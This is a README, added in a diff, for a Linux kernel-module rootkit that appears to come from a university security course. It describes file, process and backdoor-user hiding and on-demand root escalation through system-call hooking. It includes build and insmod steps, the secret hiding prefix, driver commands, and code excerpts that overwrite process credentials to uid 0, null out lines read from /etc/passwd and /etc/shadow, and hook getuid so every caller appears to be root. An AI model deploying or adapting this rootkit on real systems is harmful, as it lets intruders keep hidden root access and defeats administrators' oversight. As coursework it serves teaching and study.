@@ -1,0 +1,560 @@
+<h1 id="%3Ca%20href=%22https://github.com/bvalarezo/rootkit%22%3EROOTKIT%3C/a%3E"><a href="https://github.com/bvalarezo/rootkit">ROOTKIT</a></h1>
+
+<p>A basic rootkit Linux kernel module for exploiting kernel functions and user data. </p>
+
+<blockquote>
+<p>This rootkit was developed and intended for Ubuntu 16.04 xenial on
+kernel version x86_64 4.15.0-66-generic</p>
+</blockquote>
+
+<h3 id="Rootkit%20functionalities:">Rootkit functionalities:</h3>
+
+<ul>
+<li>File hiding</li>
+<li>Process hiding</li>
+<li>Process privilege escalation</li>
+<li>User hiding</li>
+<li>Hooking custom system calls </li>
+</ul>
+
+<h2 id="Prompt&amp;#47;Introduction">Prompt&#47;Introduction</h2>
+
+<p>After attackers manage to gain access to a remote (or local) machine and elevate their privileges to &#8220;root&#8221;, they typically want to maintain their access, while hiding their presence from the normal users and administrators of the system.</p>
+
+<p>In this project, you are asked to design and implement a basic rootkit for the Linux operating system (you can choose the exact distribution and kernel number). This rootkit should have the form of a loadable kernel module which when loaded into the kernel (by the attacker with root privileges) will do the following:</p>
+
+<ul>
+<li><p>Hide specific files and directories from showing up when a user does &#8220;ls&#8221; and similar commands (you have to come up with a protocol that allows attackers to change these)</p></li>
+<li><p>Modify the &#47;etc&#47;passwd and &#47;etc&#47;shadow file to add a backdoor account while returning the original contents of the files (pre-attack) when a normal user requests to see the file</p></li>
+<li><p>Hides specific processes from the process table when a user does a &#8220;ps&#8221;</p></li>
+<li><p>Give the ability to a malicious process to elevate its uid to 0 (root) upon demand (again this involves coming up with a protocol for doing that)</p></li>
+</ul>
+
+<p>Note that all of these should happen by intercepting the appropriate system calls in the Linux kernel and modifying the results. You should not perform the above by replacing the system binaries (like &#8220;ls&#8221;, or &#8220;ps&#8221;).</p>
+
+<h2 id="Installation">Installation</h2>
+
+<p>This module is composed of two components, the core and the driver. Each component will have to built sepeartely. </p>
+
+<blockquote>
+<p>The following commands assume that this project folder is the current directory.</p>
+
+<h3 id="Core">Core</h3>
+
+<p>The core program is the Linux kernel module that will handle system call hooking and other operations in the kernel space.
+All of these commands should be ran in <code>.&#47;core</code>. 
+<strong>You must have root privileges to run these installation commands</strong>.</p>
+</blockquote>
+
+<h4 id="Build">Build</h4>
+
+<p>To compile the module, run <code>make</code></p>
+
+<pre><code># make
+</code></pre>
+
+<h4 id="Install">Install</h4>
+
+<p>To install the module, run <code>insmod</code></p>
+
+<pre><code># insmod src&#47;blob.ko  
+</code></pre>
+
+<p>or just:</p>
+
+<pre><code># make install
+</code></pre>
+
+<blockquote>
+<p><strong>Note</strong>: Our module loads with the name <code>blob</code> when displayed from <code>lsmod</code>.</p>
+</blockquote>
+
+<h4 id="Uninstall">Uninstall</h4>
+
+<p>To uninstall the module, run <code>rmmod</code></p>
+
+<pre><code># rmmod blob
+</code></pre>
+
+<h4 id="Clean">Clean</h4>
+
+<p>In the event that you need to re-compile our module, you can clean the compiled object and kernel-object files with this command.</p>
+
+<pre><code># make clean
+</code></pre>
+
+<h3 id="Driver">Driver</h3>
+
+<p>The driver program is used to communicate to the core program from user space. This will interface the client and the core by accepting a series of command arguements. All of these commands should be ran in <code>.&#47;driver</code>. </p>
+
+<pre><code>$ cd driver
+</code></pre>
+
+<h4 id="Install-2">Install</h4>
+
+<p>Install the driver program using the C compiler.</p>
+
+<pre><code>$ cc syscall.c -o syscall
+</code></pre>
+
+<h4 id="Uninstall-2">Uninstall</h4>
+
+<p>To uninstall the driver program, delete it.</p>
+
+<pre><code>$ rm syscall
+</code></pre>
+
+<h2 id="Usage">Usage</h2>
+
+<p>Client makes a system call, with these arguments:</p>
+
+<pre><code>syscall(secret system call number, secret, command, ...)
+</code></pre>
+
+<p>Module intercepts the system call, and checks that the secret is accurate before evaluating the command.</p>
+
+<p>Use the <code>driver</code> POSIX script to send remote commands to the module.  </p>
+
+<pre><code>$ .&#47;driver COMMAND [ULONG | 0xHEXULONG | CARRAY ...]
+</code></pre>
+
+<blockquote>
+<p><strong>PLEASE NOTE: the driver script doesn&#39;t properly handle whitespace; to bypass this, execute the system call directly.</strong></p>
+</blockquote>
+
+<ul>
+<li><code>drop PID</code>: set a process&#39;s EUID to its UID</li>
+<li><code>elevate PID</code>: set a process&#39;s EUID to root</li>
+<li><code>fugitive ETC_PASSWD_LINE ETC_SHADOW_LINE</code>: hide lines in &#8220;&#47;etc&#47;passwd&#8221; and &#8220;&#47;etc&#47;shadow&#8221;</li>
+<li><code>hide PATH_OR_COMMAND_LINES</code>: hide an entity (a directory entry or ALL processes matching the command line: in that order)</li>
+<li><code>show PATH_OR_COMMAND_LINES</code>: show a hidden entity (a directory entry or ALL processes matching the command line: in that order)</li>
+<li><code>unfugitive</code>: show lines in &#8220;&#47;etc&#47;passwd&#8221; and &#8220;&#47;etc&#47;shadow&#8221;</li>
+</ul>
+
+<h2 id="File%20Hiding">File Hiding</h2>
+
+<p>Commands such as <code>ls</code>, <code>ps</code> or <code>tree</code> make use of the <code>getdents()</code> syscall to list directory entries at the given directory.</p>
+
+<p>The <code>getdents</code> syscall creates a linked list of directory entry structures (defined by <code>linux_dirent</code> and <code>linux_dirent64</code>) and fills it into a caller provided pointer and then returns the number of bytes written into the pointer back to the caller.</p>
+
+<p>In order to hide files, we just call the original <code>getdents</code> syscall to generate the structure and then we need to remove the desired <code>linux_dirent</code> structures from the linked list and alter the count of bytes returned by <code>getdents</code>.</p>
+
+<p>To determine what counts as a desired <code>linux_dirent</code> structure to remove, we check if the <code>d_name</code> field in the <code>linux_dirent</code> structure contains a set <em>prefix</em> in the file name. 
+If it contains said <em>prefix</em>, we will remove it from the linked list by shifting the entries ahead of the one we want to delete onto the current one.</p>
+
+<h3 id="Examples">Examples</h3>
+
+<p>To hide a file, you must add the <em>prefix</em> to the front of its name. </p>
+
+<blockquote>
+<p><strong>&#8220;<code>3v!1</code>&#8221;</strong> is the <em>prefix</em> for our rootkit.</p>
+</blockquote>
+
+<p>Creating a hidden text file called <code>helloworld.txt</code> using the <code>nano</code> text editor (you may use any text editor of your choice):</p>
+
+<pre><code>$ nano 3v!1helloworld.txt
+
+or using the driver
+
+$ nano helloworld.txt
+$ .&#47;driver hide helloworld.txt
+</code></pre>
+
+<p>Hiding an existing text file called <code>helloworld.txt</code>:</p>
+
+<pre><code>$ mv helloworld.txt 3v!1helloworld.txt
+
+or using the driver
+
+$ .&#47;driver hide helloworld.txt
+</code></pre>
+
+<p>To unhide a file, you must rename the file to remove the prefix.
+Unhiding a file called <code>helloworld.txt</code> which already has the specified hiding prefix:</p>
+
+<pre><code>$ mv 3v!1helloworld.txt helloworld.txt
+
+ or using the driver
+
+$ .&#47;driver show helloworld.txt
+</code></pre>
+
+<blockquote>
+<p><strong>Note:</strong> Make sure you keep track of the paths of directories&#47;files that are hidden as they will be hidden to you as well.</p>
+</blockquote>
+
+<h2 id="Process%20Hiding">Process Hiding</h2>
+
+<blockquote>
+<p><strong>PLEASE NOTE: if the argument is both a path and a process command line, the path will always take precedence, and the process will not be hidden (this only applies to the driver; the workaround is to use the system call interface manually)!</strong></p>
+</blockquote>
+
+<p>Hiding a process works in a similar manner to file hiding.
+Commands such as <code>ps</code>, <code>top</code>, <code>htop</code>, etc. make use of the <code>getdents</code> syscall on the <code>&#47;proc</code> directory to obtain details of the current processes running.
+The <code>&#47;proc</code> directory is comprised of files and directories that contain details about the system such as resource usage.
+The <code>&#47;proc</code> directory also contains directories which are named with an integer corresponding the the PID of a process which is what we will use for hiding processes.</p>
+
+<p>To hide processes, we do the same process as hiding a file except in order to determine what <code>linux_dirent</code> structure to remove, we have to perform some extra steps.
+- Since the <code>d_name</code> field of the <code>linux_dirent</code> only gives us the PID of the process which the <code>linux_dirent</code> belongs to, we have to perform a lookup of the pid to get its <code>task_struct</code>.
+- The struct <code>task_struct</code> has a comm field which contains the command name of the process which we then check if it contains the prefix.
+- If it does contain the prefix then we remove the <code>linux_dirent</code> structure, otherwise we check if the command name is in our arraylist of processes to hide. If the process name is in our arraylist, we remove the <code>linux_dirent</code> structure, otherwise it will be shown.
+- The arraylist is an array of strings that is allocated on the installation of the module and is resized when the maximum capacity is reached.</p>
+
+<h3 id="Examples-2">Examples</h3>
+
+<p>Process hiding can be done in two ways: Naming the executable file with the prefix <strong><code>3v!1</code></strong> or by using the driver to add a specific process name.</p>
+
+<p>Creating a shell script called <code>helloworld.sh</code> that will be hidden using nano text editor (you may use whatever text editor you want):</p>
+
+<pre><code>$ nano 3v!1helloworld.sh
+</code></pre>
+
+<p>or using the driver</p>
+
+<pre><code>$ nano helloworld.sh
+$ .&#47;driver hide helloworld.sh
+</code></pre>
+
+<p>Hiding a shell script called <code>helloworld.sh</code> from the process list:</p>
+
+<pre><code>$ mv helloworld.sh 3v!1helloworld.sh
+</code></pre>
+
+<p>or using the driver</p>
+
+<pre><code>$ .&#47;driver hide helloworld.sh
+</code></pre>
+
+<p>Showing a shell script called <code>helloworld.sh</code> from the process list on next execution:</p>
+
+<pre><code>$ mv 3v!1helloworld.sh helloworld.sh
+</code></pre>
+
+<p>or using the driver</p>
+
+<pre><code>$ .&#47;driver show helloworld.sh
+</code></pre>
+
+<blockquote>
+<p><strong>Note:</strong> If the process spawns subprocesses, those subprocesses will NOT be hidden (e.g. if <code>helloworld.sh</code> uses sleep 30, sleep will show up in <code>ps</code>). You must use the driver to hide these subprocesses which is shown in the next examples.</p>
+</blockquote>
+
+<p>Hiding all processes named bash using the driver:</p>
+
+<pre><code>$ .&#47;driver hide bash
+</code></pre>
+
+<blockquote>
+<p>NOTE: As is said above, there must be no files that are the same name as the process you want to hide in the current working directory (<code>cwd</code>).
+The process name you want to hide must also not be a path to an existing file.
+Otherwise the driver will hide the file and not the process.
+e.g. if there is a file called bash in <code>cwd</code> and you do <code>.&#47;driver</code> hide bash, the bash file will be hidden and not the process.</p>
+</blockquote>
+
+<p>Showing all previously hidden processes named bash using the driver:</p>
+
+<pre><code>$ .&#47;driver show bash
+</code></pre>
+
+<blockquote>
+<p>NOTE: As is said above, there must be no files that are the same name as the process you want to hide in the current working directory (<code>cwd</code>).
+The process name you want to hide must also not be a path to an existing file.
+Otherwise the driver will hide the file and not the process.
+e.g. if there is a file called bash in <code>cwd</code> and you do .&#47;driver hide bash, the bash file will be hidden and not the process.</p>
+</blockquote>
+
+<h2 id="Process%20privilege%20escalation">Process privilege escalation</h2>
+
+<p>In Linux, a process structure is defined by the <code>task_struct</code>.</p>
+
+<p>Escalating processes is done by modifying a <code>task_struct</code>&#39;s credentials. This can be accomplished by overwriting the credentials struct within the <code>task_struct</code>.</p>
+
+<p>All of a task’s credentials are held in (uid, gid) or through (groups, keys, LSM security) a refcounted structure of type <code>struct cred</code>. </p>
+
+<p>Each task points to its credentials by a pointer called <code>cred</code> in its <code>task_struct</code>.</p>
+
+<pre><code>pcred = (struct cred *)task-&#62;cred;
+</code></pre>
+
+<p>In order to escalate, we can set the credentials equal to root.</p>
+
+<pre><code>pcred-&#62;uid.val = 0;
+pcred-&#62;suid.val = 0;
+pcred-&#62;euid.val = 0;
+pcred-&#62;fsuid.val = 0;
+pcred-&#62;gid.val = 0;
+pcred-&#62;sgid.val = 0;
+pcred-&#62;egid.val = 0;
+pcred-&#62;fsgid.val = 0;
+</code></pre>
+
+<p>Our rootkit will also save the process&#39;s original credentials in a custom pid_node struct.</p>
+
+<pre><code>typedef struct pid_node {
+    pid_t       pid;
+    kuid_t uid, suid, euid, fsuid;
+    kgid_t gid, sgid, egid, fsgid;
+    struct pid_node *prev, *next;
+} PID_NODE;
+</code></pre>
+
+<p>And back it up in case the user wants to drop the privileges.</p>
+
+<pre><code>new_node-&#62;uid = pcred-&#62;uid;
+new_node-&#62;suid = pcred-&#62;suid;
+new_node-&#62;euid = pcred-&#62;euid;
+new_node-&#62;fsuid = pcred-&#62;fsuid;
+new_node-&#62;gid = pcred-&#62;gid;
+new_node-&#62;sgid = pcred-&#62;sgid;
+new_node-&#62;egid = pcred-&#62;egid;
+new_node-&#62;fsgid = pcred-&#62;fsgid;
+</code></pre>
+
+<h3 id="Example">Example</h3>
+
+<p>Use our driver program to escalate a process by its PID.</p>
+
+<p>Escalating a process with a PID 12345</p>
+
+<pre><code>$ .&#47;driver elevate 12345
+</code></pre>
+
+<p>Dropping the escalated process back to its original UID</p>
+
+<pre><code>$ .&#47;driver drop 12345
+</code></pre>
+
+<blockquote>
+<p><strong>Note:</strong> You may only drop processes you have escalated before.</p>
+</blockquote>
+
+<h2 id="User%20Hiding">User Hiding</h2>
+
+<blockquote>
+<p><strong>PLEASE NOTE: at most, 1 account can be hidden at a time</strong>
+The rootkit hides a backdoor account by hijacking the read syscall and truncating parts of the output buffer.</p>
+</blockquote>
+
+<p>The module hijacks the system calls <code>open</code>, <code>read</code>, and <code>close</code>. The idea is that when a normal file is opened, all three syscalls will return their regular outputs. However, when files such as &#47;etc&#47;passwd and &#47;etc&#47;shadow are being opened, a flag called &#8220;<em>erase</em>&#8221; is triggered for the <code>read</code> syscall to do specific hiding. </p>
+
+<p>The flag <em>erase</em> is an enum with the following definition.</p>
+
+<pre><code>enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;
+</code></pre>
+
+<p>A switch statement is used to determine the content to hide (stored in string variable <code>hidden</code>).</p>
+
+<pre><code>switch(erase){
+    case PASS_E:
+        hidden = fugitive__lines[0];
+        break;
+    case SHAD_E:
+        hidden = fugitive__lines[1];
+        break;
+    case NONE:
+        &#47;&#47; Do nothing as it is a regular file
+        break;
+}
+</code></pre>
+
+<p>We then proceed to null out the part of the content we want to hide. We substract <code>hidden</code> from return size.</p>
+
+<pre><code>if(hidden != NULL){
+    ptr = strnstr(buf, hidden, count);
+    if(ptr != NULL) {
+        memset(ptr, &#39;\0&#39;, strlen(hidden));
+        ret -= count &#60; strlen(hidden) ? count : strlen(hidden);
+    }
+}
+</code></pre>
+
+<blockquote>
+<p><strong>Note</strong> This function does not <strong>add</strong> backdoor accounts, it only hides an exisiting one. You will have to use tools such as <code>useradd</code> to create a backdoor account on the system you wish to hide.  </p>
+</blockquote>
+
+<h3 id="Example-2">Example</h3>
+
+<p>Pass 1 line from <code>&#47;etc&#47;passwd</code> along with another from <code>&#47;etc&#47;shadow</code> into the driver:</p>
+
+<pre><code>$ .&#47;driver fugitive `cat &#47;etc&#47;passwd | grep MY_USERNAME` `sudo cat &#47;etc&#47;shadow | grep MY_USERNAME`
+</code></pre>
+
+<p>Making those lines visible again is as simple as:</p>
+
+<pre><code>$ .&#47;driver unfugitive
+</code></pre>
+
+<h2 id="Details%20on%20the%20Core">Details on the Core</h2>
+
+<p>The rootkit core is built upon the System Call Table Modifier (<code>sctm</code> for short), which manages hooks on the system call table.
+Under this approach, extensibility abounds.</p>
+
+<h3 id="Locating%20the%20System%20Call%20Table">Locating the System Call Table</h3>
+
+<p>For cleanliness (and ease of implementation), we opted to use the kernel&#39;s symbol table interface (<code>kallsyms</code>).
+However, that&#39;s not to say that this is the only method of locating the syscall table that <code>sctm</code> supports.
+<code>sctm</code>&#39;s <code>sctm__locate_system_call_table</code> can easily be modified to locate the system call table in any number of ways.
+For example, we explored:
+- searching for a sentinel address
+and
+- probabilistic classification</p>
+
+<h3 id="Using%20the%20System%20Call%20Table%20Modifier%20(%3Ccode%3Esctm%3C/code%3E)">Using the System Call Table Modifier (<code>sctm</code>)</h3>
+
+<p><code>sctm</code> is partially object-oriented (in that all operations occur on a <code>struct sctm *</code>);
+as a result, a <code>struct sctm</code> instance <strong>must</strong> be initialized with <code>sctm_init</code> and finalized with <code>sctm_cleanup</code>.
+A simple (likely incomplete) example follows.</p>
+
+<p><code>.&#47;include&#47;sctm.h</code>:</p>
+
+<blockquote>
+<p><strong>OMITTED FOR BREVITY</strong></p>
+</blockquote>
+
+<p><code>.&#47;Makefile</code>:</p>
+
+<blockquote>
+<p><strong>PLEASE NOTE: because of undefined reference issues in a multi-sourced module, the module is built as a code blob</strong></p>
+</blockquote>
+
+<pre><code>BLOB := blob.c
+CLEAN_TARGETS := "$(BLOB)" .cache.mk *.ko modules.order Module.symvers *.o
+VERSION := `uname -r`
+KDIR := &#47;lib&#47;modules&#47;$(VERSION)&#47;build
+WD := `pwd`
+SRC := $(WD)&#47;src
+SRCS := example.c sctm.c
+
+kbuild:
+    if [ -e "$(BLOB)" ]; then rm "$(BLOB)"; fi
+    cd "$(SRC)" &#38;&#38; cat $(SRCS) &#62; "$(BLOB)"
+    make -C "$(KDIR)" M="$(SRC)" modules
+
+clean:
+    cd "$(SRC)" &#38;&#38; for TARGET in $(CLEAN_TARGETS); do [ -e "$${TARGET}" ] &#38;&#38; rm "$${TARGET}"; done
+    make -C "$(KDIR)" M="$(SRC)" clean
+
+install:
+    make &#38;&#38; sudo insmod "$(SRC)"&#47;*.ko
+</code></pre>
+
+<p><code>.&#47;src&#47;Kbuild</code>:</p>
+
+<pre><code>EXTRA-CFLAGS += -I"$(PWD)&#47;include" -Wall -Werror
+obj-m += blob.o
+</code></pre>
+
+<p><code>.&#47;src&#47;example.c</code>:</p>
+
+<pre><code>#define __KERNEL__
+
+#include &#60;linux&#47;errno.h&#62;
+#include &#60;linux&#47;init.h&#62;
+#include &#60;linux&#47;kernel.h&#62;
+#include &#60;linux&#47;module.h&#62;
+
+#include "sctm.h"
+
+&#47;* tell all `getuid` requests that the caller is root *&#47;
+
+struct sctm_hook hook;
+int inited = 0;
+struct sctm modifier;
+
+&#47;* tell all callers that their UID is 0 (they&#39;re root) *&#47;
+asmlinkage unsigned long lie(void);
+
+void __exit exit_module(void) {
+  ...
+
+  sctm_cleanup(&#38;modifier);
+
+  ...
+}
+
+int __init init_module(void) {
+  int retval;
+
+  ...
+
+  if ((retval = sctm_init(&#38;modifier)))
+    return retval;
+  hook = (struct sctm_hook) {
+    .call = __NR_getuid,
+    .hook = (sctm_syscall_handler_t) &#38;lie
+  };
+
+  if ((retval = sctm_hook(&#38;modifier, &#38;hook)) {
+    sctm_cleanup(&#38;modifier); &#47;* ignore failure *&#47;
+    return retval;
+  }
+
+  &#47;* all `getuid` callers will now believe they&#39;re root *&#47;
+
+  return 0;
+}
+
+asmlinkage unsigned long lie(void) {
+  return 0;
+
+  &#47;*
+  if we wanted to defer to the original instead,
+  we could use something like this:
+    `return ((asmlinkage unsigned long (*)(void)) hook.original)();`
+  *&#47;
+}
+
+module_exit(exit_module)
+module_init(init_module)
+
+MODULE_LICENSE("GPL");
+</code></pre>
+
+<h2 id="Distribution%20of%20work">Distribution of work</h2>
+
+<ul>
+<li>Driver, client communication with modules, hooking custom system calls, and consolidation of all functional modules - Bailey Defino</li>
+<li>Process privlege escalation - Bryan Valarezo</li>
+<li>Process hiding and file hiding - Jeffrey Wong</li>
+<li>Backdoor account&#47;hiding users from &#47;etc&#47;shadow and &#47;etc&#47;passwd - Junming Liu</li>
+</ul>
+
+<h2 id="Sources">Sources</h2>
+
+<p>Helpful resources used during the development of this project</p>
+
+<ol start="1">
+<li><a href="https://blog.trailofbits.com/2019/01/17/how-to-write-a-rootkit-without-really-trying/">https:&#47;&#47;blog.trailofbits.com&#47;2019&#47;01&#47;17&#47;how-to-write-a-rootkit-without-really-trying&#47;</a></li>
+<li><a href="https://davejingtian.org/2019/02/25/syscall-hijacking-in-2019/">https:&#47;&#47;davejingtian.org&#47;2019&#47;02&#47;25&#47;syscall-hijacking-in-2019&#47;</a></li>
+<li><a href="https://www.kernel.org/doc/Documentation/security/credentials.txt">https:&#47;&#47;www.kernel.org&#47;doc&#47;Documentation&#47;security&#47;credentials.txt</a></li>
+<li><a href="https://github.com/torvalds/linux/blob/master/include/linux/sched.h">https:&#47;&#47;github.com&#47;torvalds&#47;linux&#47;blob&#47;master&#47;include&#47;linux&#47;sched.h</a></li>
+<li><a href="http://tldp.org/LDP/lkmpg/2.6/html/lkmpg.html">http:&#47;&#47;tldp.org&#47;LDP&#47;lkmpg&#47;2.6&#47;html&#47;lkmpg.html</a></li>
+<li><a href="https://www.kernel.org/doc/html/latest/media/uapi/v4l/io.html">https:&#47;&#47;www.kernel.org&#47;doc&#47;html&#47;latest&#47;media&#47;uapi&#47;v4l&#47;io.html</a></li>
+<li><a href="https://mammon.github.io/Text/kernel%5C_read.txt">https:&#47;&#47;mammon.github.io&#47;Text&#47;kernel\_read.txt</a></li>
+<li><a href="https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module">https:&#47;&#47;stackoverflow.com&#47;questions&#47;1184274&#47;read-write-files-within-a-linux-kernel-module</a></li>
+<li><a href="https://elixir.bootlin.com/">https:&#47;&#47;elixir.bootlin.com&#47;</a></li>
+<li><a href="http://man7.org/linux/man-pages/man2/getdents.2.html">http:&#47;&#47;man7.org&#47;linux&#47;man-pages&#47;man2&#47;getdents.2.html</a></li>
+<li><a href="https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example">https:&#47;&#47;stackoverflow.com&#47;questions&#47;2103315&#47;linux-kernel-system-call-hooking-example</a></li>
+<li><a href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/structdentry.html">https:&#47;&#47;docs.huihoo.com&#47;doxygen&#47;linux&#47;kernel&#47;3.7&#47;structdentry.html</a></li>
+<li><a href="http://tuxthink.blogspot.com/2012/07/module-to-find-task-from-its-pid.html">http:&#47;&#47;tuxthink.blogspot.com&#47;2012&#47;07&#47;module-to-find-task-from-its-pid.html</a></li>
+<li><a href="https://ccsl.carleton.ca/%7Edmccarney/COMP4108/a2.html">https:&#47;&#47;ccsl.carleton.ca&#47;~dmccarney&#47;COMP4108&#47;a2.html</a></li>
+<li><a href="https://stackoverflow.com/questions/8250078/how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module">https:&#47;&#47;stackoverflow.com&#47;questions&#47;8250078&#47;how-can-i-get-a-filename-from-a-file-descriptor-inside-a-kernel-module</a></li>
+</ol>
+
+<h2 id="License">License</h2>
+
+<p>Copyright 2019. By collaborators
+<a href="https://bdefino.github.io">Bailey Defino</a>, <a href="https://bvalarezo.github.io">Bryan Valarezo</a>, <a href="https://jeffrewong.github.io">Jeffrey Wong</a>, <a href="https://junmingl.github.io">Junming Liu</a></p>
+
+<p>This program is free software: you can redistribute it and&#47;or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.</p>
+
+<p>This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.</p>
+
+<p>You should have received a copy of the GNU General Public License
+along with this program.  If not, see <a href="https://www.gnu.org/licenses/">https:&#47;&#47;www.gnu.org&#47;licenses&#47;</a>.</p>
